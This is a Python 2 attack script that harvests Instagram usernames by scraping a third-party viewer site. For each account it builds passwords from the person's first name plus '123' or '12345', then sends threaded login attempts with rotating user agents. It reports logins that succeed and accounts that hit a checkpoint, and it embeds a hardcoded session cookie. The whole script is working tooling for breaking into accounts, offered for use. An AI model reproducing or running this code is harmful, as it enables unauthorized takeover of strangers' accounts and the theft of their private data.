import os

G0    = '\x1b[0;32m'
G1    = '\x1b[1;32m'
C0    = '\x1b[0;36m'
C1    = '\x1b[1;36m'
P0    = '\x1b[0;35m'
P1    = '\x1b[1;35m'
W0    = '\x1b[0;37m'
W1    = '\x1b[1;37m'
B0    = '\x1b[0;34m'
B1    = '\x1b[1;34m'
R0    = '\x1b[0;31m'
R1    = '\x1b[1;31m'
D0    = '\x1b[1;90m'
EW    = '\x1b[1;41;97m'
RE    = '\x1b[0;0m'
h     = '\x1b[92m'
k     = '\x1b[93m'
p     = '\x1b[0m'
kuki  = '4974485705%3ABuLCC4VsX9BvyA%3A6;'
id    = []
oh    = []
hasil = []
jl    = []

os.system('clear')
print '%s\n    //  \\\\\n   _\\\\()//_  %s\xe2\x95\xa6\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97%s\xe2\x94\x8c\xe2\x94\x90 \xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac \xe2\x94\xac\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\xa4\n  %s/ //  \\\\ \\ %s\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x97 \xe2\x95\x91 \xe2\x95\xa0\xe2\x95\x90\xe2\x95\xa3%s\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x82 \xe2\x94\x82 \xe2\x94\x82 \xe2\x94\x9c\xe2\x94\xa4 \n  %s | \\__/ |  %s\xe2\x95\xa9\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x95\xa9 \xe2\x95\xa9 \xe2\x95\xa9%s\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98 \xe2\x94\xb4 \xe2\x94\x94\xe2\x94\x80\xe2\x94\xa4   ' % (G1, R1, W1, G1, R1, W1, G1, R1, W1)
print ' %s-----------------------------------------\n %s   Author : SalisM3 feat NjankSoekamti   %s\n %s-----------------------------------------\n' % (D0, EW, RE, D0)
from bs4 import BeautifulSoup
from multiprocessing.pool import ThreadPool
import requests, json, random, re, time, sys
try:
    cek  = requests.get('https://instagram.com/salism3/?__a=1', cookies={'sessionid': kuki}).json()
    user = raw_input('   %s[+] %sUsername : ' % (G0, W0))

    print '   %s[+] %sGetting Followers Username ' % (G0, W0)
    print '   %s[+] %sPlease Wait This Takes Time ' % (G0, W0)

    url    = 'http://gopicta.com/' + user
    respon = requests.get(url)
    soup   = BeautifulSoup(respon.content, 'html.parser')

    for link in soup.find_all('a'):
        a = link.get('href').replace('http://gopicta.com/', '')
        if '/' in a or '#' in a or '?' in a:
            pass
        else:
            id.append(a)

    for jump in range(20):
        rd      = random.choice(id)
        url2    = 'http://gopicta.com/' + rd
        respon2 = requests.get(url2)
        soup2   = BeautifulSoup(respon2.content, 'html.parser')

        for link2 in soup2.find_all('a'):
            a2 = link2.get('href').replace('http://gopicta.com/', '')
            if '/' in a2 or '#' in a2 or '?' in a2:
                pass
            else:
                id.append(a2)

    print '   %s[+] %sSuccess Getting Followers Username' % (G0, W0)
    print G0 + '   [+] ' + W0 + 'Total: ' + h + str(len(id))
    print '   %s[+] %sCracking Start ...\n' % (G0, W0)
except ValueError:
    print '   %s[x] %sSession Expired ' % (R0, W0)
    print '   %s[x] %sPlease Contact Author \n' % (R0, W0)
    exit()
except requests.exceptions.ConnectionError:
    print R0 + '   [x] ' + W0 + 'Signal Error'
    exit()
except KeyboardInterrupt:
    print R0 + '   [x] ' + W0 + 'Exit: Ok'
    exit()
except IndexError:
    print R0 + '   [x] ' + W0 + 'Getting Failed'
    exit()

def hajar(arg):
    try:
        c = requests.get('https://instagram.com/' + arg + '/?__a=1', cookies={'sessionid': kuki}).json()
        d = c['graphql']['user']['full_name']
        e = d.replace('A', 'a').replace('B', 'b').replace('C', 'c').replace('D', 'd').replace('E', 'e').replace('F', 'f').replace('G', 'g').replace('H', 'h').replace('I', 'i').replace('J', 'j').replace('K', 'k').replace('L', 'l').replace('M', 'm').replace('N', 'n').replace('O', 'o').replace('P', 'p').replace('Q', 'q').replace('R', 'r').replace('S', 's').replace('T', 't').replace('U', 'u').replace('V', 'v').replace('W', 'w').replace('X', 'x').replace('Y', 'y').replace('Z', 'z').replace('_', '').replace('.', '')
        pas = e.split(' ')
        pw  = (pas[0] + '123', pas[0] + '12345')
        for gg in pw:
            BASE_URL     = 'https://www.instagram.com/accounts/login/'
            LOGIN_URL    = BASE_URL + 'ajax/'
            headers_list = [
             'Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101 Firefox/41.0',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
             'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246']
            USERNAME        = arg
            PASSWD          = gg
            USER_AGENT      = headers_list[random.randrange(0, 4)]
            session         = requests.Session()
            session.headers = {'user-agent': USER_AGENT}
            session.headers.update({'Referer': BASE_URL})
            req             = session.get(BASE_URL)
            soup            = BeautifulSoup(req.content, 'html.parser')
            body            = soup.find('body')
            pattern         = re.compile('window._sharedData')
            script          = body.find('script', text=pattern)
            script          = script.get_text().replace('window._sharedData = ', '')[:-1]
            data            = json.loads(script)
            csrf            = data['config'].get('csrf_token')
            login_data      = {'username': USERNAME, 'password': PASSWD}
            session.headers.update({'X-CSRFToken': csrf})
            login           = session.post(LOGIN_URL, data=login_data, allow_redirects=True)

            if 'userId' in login.content:
                print (h + '   [OK] ' + p + arg + ' => ' + gg)()
                hasil.append('oh')
            elif 'checkpoint' in login.content:
                print k + '   [CP] ' + p + arg + ' => ' + gg
                hasil.append('oh')

    except:
        pass


t = ThreadPool(12)
t.map(hajar, id)
if len(hasil) > 0:
    print '\n   %s[+] %sDone!' % (G0, W0)
else:
    print '   %s[x] %sNo Result Found' % (R0, W0)
